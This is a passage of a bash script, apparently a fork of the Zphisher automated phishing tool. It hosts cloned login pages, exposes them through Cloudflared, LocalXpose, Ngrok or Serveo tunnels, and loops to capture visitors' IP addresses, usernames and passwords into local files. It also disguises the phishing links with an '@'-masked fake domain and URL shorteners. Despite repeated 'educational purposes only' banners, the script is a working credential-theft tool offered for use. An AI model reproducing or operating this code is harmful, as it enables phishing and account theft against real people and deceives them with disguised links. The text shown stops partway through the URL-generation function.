#!/bin/bash

##   Zphisher 	: 	Automated Phishing Tool (Fork) - Upgraded Edition
##   Original Author : 	TAHMID RAYAT
##   Fork Author 	: 	MUHAMMAD TAEZEEM
##   Version 	: 	3.0.0
##   Github 	: 	https://github.com/htr-tech/zphisher (original)
##   NOTE 	: 	This tool is for EDUCATIONAL PURPOSES ONLY
##   Changes 	: 	Modernized bash, Ngrok/Serveo tunnels, improved UI,
##              	new templates, logging, CLI args, categorized menus


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
##

##   THANKS TO :
##   1RaY-1 - https://github.com/1RaY-1
##   Aditya Shakya - https://github.com/adi1090x
##   Ali Milani Amin - https://github.com/AliMilani
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Moises Tapia - https://github.com/MoisesTapia
##   Mr.Derek - https://github.com/E343IO
##   Mustakim Ahmed - https://github.com/bdhackers009
##   TheLinuxChoice - https://twitter.com/linux_choice

# ============================================================================
# CONFIGURATION
# ============================================================================

__version__="3.0.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080'

## Log file
LOG_FILE="zphisher.log"

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
ITALIC="$(printf '\033[3m')"
UNDERLINE="$(printf '\033[4m')"
RESET="$(printf '\033[0m')"

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

## Logging function
log() {
	local level="$1"
	shift
	local message="$*"
	local timestamp
	timestamp=$(date '+%Y-%m-%d %H:%M:%S')
	echo "[$timestamp] [$level] $message" >> "$BASE_DIR/$LOG_FILE"
}

## Spinner animation
spinner() {
	local pid=$1
	local msg="${2:-Loading...}"
	local delay=0.1
	local spinchars='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
	while kill -0 "$pid" 2>/dev/null; do
		for (( i=0; i<${#spinchars}; i++ )); do
			printf "\r${GREEN}[${WHITE}${spinchars:$i:1}${GREEN}]${CYAN} %s" "$msg"
			sleep $delay
		done
	done
	printf "\r%*s\r" $((${#msg} + 6)) " "  # Clear the line
}

## Progress bar
progress_bar() {
	local current=$1
	local total=$2
	local width=40
	local percentage=$((current * 100 / total))
	local filled=$((current * width / total))
	local empty=$((width - filled))
	printf "\r${GREEN}[${WHITE}"
	printf '█%.0s' $(seq 1 $filled 2>/dev/null)
	printf '░%.0s' $(seq 1 $empty 2>/dev/null)
	printf "${GREEN}]${CYAN} %3d%%${WHITE}" "$percentage"
}

## Print styled status messages
info_msg() { echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} $*${WHITE}"; }
warn_msg() { echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} $*${WHITE}"; }
error_msg() { echo -e "\n${RED}[${WHITE}!${RED}]${RED} $*${WHITE}"; }
success_msg() { echo -e "\n${GREEN}[${WHITE}✓${GREEN}]${GREEN} $*${WHITE}"; }

## Initialize directories
init_dirs() {
	local dirs=(".server" "auth" ".server/www")

	for dir in "${dirs[@]}"; do
		if [[ "$dir" == ".server/www" && -d "$dir" ]]; then
			rm -rf "$dir"
		fi
		mkdir -p "$dir"
	done

	# Remove old log files
	rm -f ".server/.loclx" ".server/.cld.log" ".server/.ngrok.log" 2>/dev/null
	log "INFO" "Directories initialized"
}

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	log "INFO" "Program interrupted by user (SIGINT)"
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	log "INFO" "Program terminated (SIGTERM)"
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	local processes=("php" "cloudflared" "loclx" "ngrok" "ssh")
	for process in "${processes[@]}"; do
		if pidof "${process}" > /dev/null 2>&1; then
			killall "${process}" > /dev/null 2>&1
		fi
	done
	log "INFO" "Killed existing tunnel/server processes"
}

## Version comparison helper
version_gt() {
	test "$(printf '%s\n' "$@" | sort -V | head -n 1)" != "$1"
}

# ============================================================================
# UPDATE & NETWORK
# ============================================================================

## Check for a newer release
check_update() {
	info_msg "Checking for update : "
	local relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	local new_version
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	local tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ -n "$new_version" && "$new_version" != "$__version__" ]]; then
		echo -ne "${ORANGE}update available (${new_version})\n${WHITE}"
		log "INFO" "Update available: $new_version (current: $__version__)"
		sleep 2
		info_msg "Downloading Update..."
		pushd "$HOME" > /dev/null 2>&1 || return 1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

		if [[ -e ".zphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			if [[ $? -ne 0 ]]; then
				error_msg "Error occurred while extracting."
				log "ERROR" "Update extraction failed"
				reset_color
				exit 1
			fi
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1 || true
			{ sleep 3; clear; banner_small; }
			success_msg "Successfully updated! Run zphisher again"
			echo
			log "INFO" "Update installed successfully"
			{ reset_color; exit 1; }
		else
			error_msg "Error occurred while downloading."
			log "ERROR" "Update download failed"
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}up to date (v${__version__})\n${WHITE}"
		sleep .5
	fi
}

## Check Internet Status
check_status() {
	info_msg "Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	if [[ $? -eq 0 ]]; then
		echo -e "${GREEN}Online ✓${WHITE}"
		check_update
	else
		echo -e "${RED}Offline ✗${WHITE}"
		warn_msg "Some features may not work without internet."
		log "WARN" "No internet connection detected"
	fi
}

# ============================================================================
# BANNERS
# ============================================================================

## Banner
banner() {
	cat <<- EOF
		${ORANGE}${BOLD}
		${ORANGE} ╔═══════════════════════════════════════════════╗
		${ORANGE} ║  ______      _     _     _                   ║
		${ORANGE} ║ |___  /     | |   (_)   | |                  ║
		${ORANGE} ║    / / _ __ | |__  _ ___| |__   ___ _ __     ║
		${ORANGE} ║   / / | '_ \| '_ \| / __| '_ \ / _ \ '__|   ║
		${ORANGE} ║  / /__| |_) | | | | \__ \ | | |  __/ |      ║
		${ORANGE} ║ /_____| .__/|_| |_|_|___/_| |_|\___|_|      ║
		${ORANGE} ║       | |                                    ║
		${ORANGE} ║       |_|         ${RED}v${__version__}${ORANGE}                      ║
		${ORANGE} ╚═══════════════════════════════════════════════╝${RESET}

		${GREEN}[${WHITE}★${GREEN}]${CYAN} Fork by ${BOLD}Muhammad Taezeem${RESET}${CYAN} (Educational Purposes Only)
		${GREEN}[${WHITE}★${GREEN}]${CYAN} Original by htr-tech (tahmid.rayat)
		${DIM}${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}${BOLD}
		${BLUE}  ╔══════════════════════════════════════╗
		${BLUE}  ║  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄  ║
		${BLUE}  ║  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄  ║
		${BLUE}  ║  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀  ║
		${BLUE}  ╚══════════════════════════════════════╝${RESET}
		${DIM}${WHITE}     v${__version__} | Educational Use Only${RESET}
	EOF
}

# ============================================================================
# DEPENDENCIES
# ============================================================================

## Detection of package manager
detect_pkg_manager() {
	if command -v pkg &>/dev/null; then echo "pkg"
	elif command -v apt &>/dev/null; then echo "apt"
	elif command -v apt-get &>/dev/null; then echo "apt-get"
	elif command -v pacman &>/dev/null; then echo "pacman"
	elif command -v dnf &>/dev/null; then echo "dnf"
	elif command -v yum &>/dev/null; then echo "yum"
	elif command -v brew &>/dev/null; then echo "brew"
	elif command -v apk &>/dev/null; then echo "apk"
	else echo "unknown"
	fi
}

## Install a single package
install_pkg() {
	local pkg_name="$1"
	local pm
	pm=$(detect_pkg_manager)

	case "$pm" in
		pkg)     pkg install "$pkg_name" -y ;;
		apt)     sudo apt install "$pkg_name" -y ;;
		apt-get) sudo apt-get install "$pkg_name" -y ;;
		pacman)  sudo pacman -S "$pkg_name" --noconfirm ;;
		dnf)     sudo dnf -y install "$pkg_name" ;;
		yum)     sudo yum -y install "$pkg_name" ;;
		brew)    brew install "$pkg_name" ;;
		apk)     apk add --no-cache "$pkg_name" ;;
		*)
			error_msg "Unsupported package manager. Install '${pkg_name}' manually."
			log "ERROR" "Unsupported package manager for $pkg_name"
			return 1
			;;
	esac
}

## Install all dependencies
dependencies() {
	info_msg "Checking required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if ! command -v proot &>/dev/null; then
			info_msg "Installing package : ${ORANGE}proot${CYAN}"
			pkg install proot resolv-conf -y
		fi
		if ! command -v tput &>/dev/null; then
			info_msg "Installing package : ${ORANGE}ncurses-utils${CYAN}"
			pkg install ncurses-utils -y
		fi
	fi

	local required_pkgs=("php" "curl" "unzip" "wget" "git")
	local missing_pkgs=()

	for pkg in "${required_pkgs[@]}"; do
		if ! command -v "$pkg" &>/dev/null; then
			missing_pkgs+=("$pkg")
		fi
	done

	if [[ ${#missing_pkgs[@]} -eq 0 ]]; then
		success_msg "All packages already installed."
		log "INFO" "All dependencies satisfied"
	else
		local total=${#missing_pkgs[@]}
		local count=0
		for pkg in "${missing_pkgs[@]}"; do
			((count++))
			info_msg "Installing package ($count/$total): ${ORANGE}$pkg${CYAN}"
			install_pkg "$pkg"
			if [[ $? -eq 0 ]]; then
				log "INFO" "Installed: $pkg"
			else
				error_msg "Failed to install $pkg"
				log "ERROR" "Failed to install: $pkg"
				{ reset_color; exit 1; }
			fi
		done
		success_msg "All packages installed successfully."
	fi
}

# ============================================================================
# DOWNLOAD & INSTALL BINARIES
# ============================================================================

## Download with progress reporting
download() {
	local url="$1"
	local output="$2"
	local file
	file=$(basename "$url")

	rm -rf "$file" "$output" 2>/dev/null

	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		case "${file##*.}" in
			zip)
				unzip -qq "$file" > /dev/null 2>&1
				mv -f "$output" ".server/$output" > /dev/null 2>&1
				;;
			tgz|gz)
				tar -zxf "$file" > /dev/null 2>&1
				mv -f "$output" ".server/$output" > /dev/null 2>&1
				;;
			*)
				mv -f "$file" ".server/$output" > /dev/null 2>&1
				;;
		esac
		chmod +x ".server/$output" > /dev/null 2>&1
		rm -rf "$file"
		log "INFO" "Downloaded: $output"
	else
		error_msg "Error occurred while downloading ${output}."
		log "ERROR" "Download failed: $url"
		{ reset_color; exit 1; }
	fi
}

## Detect system architecture
detect_arch() {
	local arch
	arch=$(uname -m)
	case "$arch" in
		*'arm'*|*'Android'*) echo "arm" ;;
		*'aarch64'*)         echo "arm64" ;;
		*'x86_64'*)          echo "amd64" ;;
		*)                   echo "386" ;;
	esac
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		success_msg "Cloudflared already installed."
		return
	fi

	info_msg "Installing Cloudflared..."
	local arch
	arch=$(detect_arch)
	download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${arch}" 'cloudflared'
	success_msg "Cloudflared installed."
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		success_msg "LocalXpose already installed."
		return
	fi

	info_msg "Installing LocalXpose..."
	local arch
	arch=$(detect_arch)
	download "https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip" 'loclx'
	success_msg "LocalXpose installed."
}

## Install Ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		success_msg "Ngrok already installed."
		return
	fi

	info_msg "Installing Ngrok..."
	local arch
	arch=$(detect_arch)
	local ngrok_arch
	case "$arch" in
		arm)   ngrok_arch="arm" ;;
		arm64) ngrok_arch="arm64" ;;
		amd64) ngrok_arch="amd64" ;;
		*)     ngrok_arch="386" ;;
	esac
	download "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${ngrok_arch}.tgz" 'ngrok'
	success_msg "Ngrok installed."
}

# ============================================================================
# TUNNEL SERVICES
# ============================================================================

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day. ${RESETBG}\n"
	echo -e "${DIM}${CYAN}  Remember: This tool is for EDUCATIONAL PURPOSES ONLY.${RESET}\n"
	log "INFO" "User exited gracefully"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}${BOLD} ═══ About ═══${RESET}

		${GREEN} Fork By    ${RED}:  ${ORANGE}${BOLD}MUHAMMAD TAEZEEM${RESET}
		${GREEN} Original   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN} Github     ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN} Version    ${RED}:  ${ORANGE}${__version__}
		${GREEN} Upgraded   ${RED}:  ${CYAN}Ngrok, Serveo, improved UI, logging, CLI args

		${WHITE} ${REDBG}${BOLD} ⚠  Warning: ${RESETBG}
		${CYAN}  This Tool is for ${BOLD}EDUCATIONAL PURPOSES ONLY${RESET}${CYAN}!
		  Author will not be responsible for any misuse
		  of this toolkit!${WHITE}
		
		${WHITE} ${CYANBG}${BOLD} Special Thanks to: ${RESETBG}
		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  KasRoudra, E343IO, sepp0, TheLinuxChoice,
		  Yisus7u7

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			info_msg "Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n5 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Port [1024-65535] : ${WHITE}" CU_P
		if [[ -n "${CU_P}" && "${CU_P}" =~ ^[0-9]+$ && ${CU_P} -ge 1024 && ${CU_P} -le 65535 ]]; then
			PORT=${CU_P}
			echo
			log "INFO" "Custom port set: $PORT"
		else
			warn_msg "Invalid Port: $CU_P, Try Again..."
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Using Default Port ${BOLD}$PORT${RESET}${BLUE}...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	info_msg "Setting up server..."
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	info_msg "Starting PHP server on ${BOLD}$HOST:$PORT${RESET}..."
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
	log "INFO" "PHP server started on $HOST:$PORT for $website"
}

## Get IP address
capture_ip() {
	local IP
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
	log "INFO" "Captured IP: $IP"
}

## Get credentials
capture_creds() {
	local ACCOUNT PASSWORD
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
	log "INFO" "Captured credentials for: $ACCOUNT"
}

## Print data (capture loop)
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}✓${GREEN}]${GREEN} Victim IP Found!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}✓${GREEN}]${GREEN} Login info Found!!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm -f .cld.log > /dev/null 2>&1
	cusport
	info_msg "Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	info_msg "Launching Cloudflared..."
	echo

	if command -v termux-chroot &>/dev/null; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	{ sleep 8; local cldflr_url; cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log"); }
	log "INFO" "Cloudflared URL: $cldflr_url"
	custom_url "$cldflr_url"
	capture_data
}

## LocalXpose Auth
localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	local auth_f
	[[ -d ".localxpose" ]] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	if [[ "$(./.server/loclx account status | grep Error)" ]]; then
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token: ${ORANGE}" loclx_token
		if [[ -z "$loclx_token" ]]; then
			warn_msg "You have to input Localxpose Token."
			sleep 2
			tunnel_menu
		else
			echo -n "$loclx_token" > "$auth_f" 2>/dev/null
		fi
	fi
}

## Start LocalXpose
start_loclx() {
	cusport
	info_msg "Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	local loclx_region
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	info_msg "Launching LocalXpose (Region: ${loclx_region})..."

	if command -v termux-chroot &>/dev/null; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region "${loclx_region}" --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region "${loclx_region}" --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	local loclx_url
	loclx_url=$(grep -o '[0-9a-zA-Z.]*.loclx.io' .server/.loclx)
	log "INFO" "LocalXpose URL: $loclx_url"
	custom_url "$loclx_url"
	capture_data
}

## Start Ngrok
start_ngrok() {
	cusport
	info_msg "Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }

	# Check if authtoken is configured
	if [[ ! -e "$HOME/.config/ngrok/ngrok.yml" && ! -e "$HOME/.ngrok2/ngrok.yml" ]]; then
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Ngrok requires an authtoken."
		echo -e "${GREEN} Sign up at ${ORANGE}https://dashboard.ngrok.com${GREEN} and get your token.\n"
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Ngrok Authtoken: ${WHITE}" ngrok_token
		if [[ -z "$ngrok_token" ]]; then
			warn_msg "You have to input Ngrok Authtoken."
			sleep 2
			tunnel_menu
			return
		else
			./.server/ngrok config add-authtoken "$ngrok_token" > /dev/null 2>&1
		fi
	fi

	info_msg "Launching Ngrok..."

	./.server/ngrok http "$HOST":"$PORT" --log=stdout > .server/.ngrok.log 2>&1 &
	sleep 8

	local ngrok_url
	ngrok_url=$(grep -o 'url=https://[a-zA-Z0-9.-]*\.ngrok-free\.app' .server/.ngrok.log | head -1 | cut -d= -f2)
	log "INFO" "Ngrok URL: $ngrok_url"
	custom_url "$ngrok_url"
	capture_data
}

## Start Serveo (SSH-based tunnel)
start_serveo() {
	cusport
	info_msg "Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	info_msg "Launching Serveo (SSH tunnel)..."
	echo

	ssh -o StrictHostKeyChecking=no -R 80:$HOST:$PORT serveo.net > .server/.serveo.log 2>&1 &
	sleep 8

	local serveo_url
	serveo_url=$(grep -o 'https://[a-zA-Z0-9.-]*\.serveo\.net' .server/.serveo.log | head -1)

	if [[ -z "$serveo_url" ]]; then
		warn_msg "Failed to get Serveo URL. Serveo may be down. Try another tunnel."
		log "ERROR" "Serveo tunnel failed"
		{ sleep 3; tunnel_menu; }
		return
	fi

	log "INFO" "Serveo URL: $serveo_url"
	custom_url "$serveo_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	info_msg "Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	success_msg "Successfully Hosted at : ${CYAN}http://$HOST:$PORT"
	log "INFO" "Localhost started at $HOST:$PORT"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${GREEN}${BOLD} ═══ Select Tunnel Service ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost      ${DIM}(No tunnel, local only)${RESET}
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared    ${GREEN}[${CYAN}Recommended${GREEN}]${RESET}
		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose     ${GREEN}[${CYAN}Max 15 Min${GREEN}]${RESET}
		${RED}[${WHITE}04${RED}]${ORANGE} Ngrok          ${GREEN}[${CYAN}Requires Auth${GREEN}]${RESET}
		${RED}[${WHITE}05${RED}]${ORANGE} Serveo         ${GREEN}[${CYAN}SSH-based, No Setup${GREEN}]${RESET}

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		4 | 04)
			start_ngrok;;
		5 | 05)
			start_serveo;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

# ============================================================================
# URL MASKING & SHORTENING
# ============================================================================

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			info_msg "Using custom Masked URL: ${GREEN}$mask"
		else
			warn_msg "Invalid URL type. Using the default one."
		fi
	fi
}

## URL Shortener
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	local short
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo "${short}" | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		processed_url=${short#http*//}
	fi
}

custom_url() {
	local url=${1#http*//}
	local isgd="https://is.gd/create.php?format=simple&url="
	local shortcode="https://api.shrtco.de/v2/shorten?url="
	local tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|ngrok-free.app|ngrok.io|serveo.net) ]]; then
		if [[ $(site_stat "$isgd") == 2* ]]; then
			shorten "$isgd" "$url"
		elif [[ $(site_stat "$shortcode") == 2* ]]; then
			shorten "$shortcode" "$url"
		else
			shorten "$tinyurl" "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${GREEN}${BOLD} ═══ Generated URLs ═══${RESET}"
	echo -e "\n${RED}[${WHITE}1${RED}]${BLUE} Direct URL   : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}2${RED}]${BLUE} Short URL    : ${ORANGE}$processed_url"
